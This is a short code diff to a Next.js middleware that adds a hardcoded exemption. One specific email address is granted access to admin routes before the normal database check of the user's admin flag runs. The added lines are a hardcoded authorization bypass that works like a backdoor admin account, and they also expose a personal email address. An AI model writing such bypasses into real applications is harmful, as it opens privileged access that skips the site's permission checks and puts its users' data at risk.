@@ -119,6 +119,12 @@ export async function middleware(request: NextRequest) {
     // Check admin permission for admin routes
     if (isAdminRoute && user) {
       try {
+        // First check if user is the exempt admin user
+        if (user.email === 'walterjonesjr@gmail.com') {
+          // Always grant admin access to exempt user
+          return response;
+        }
+
         const { data: profile } = await supabase
           .from('profiles')
           .select('is_admin')
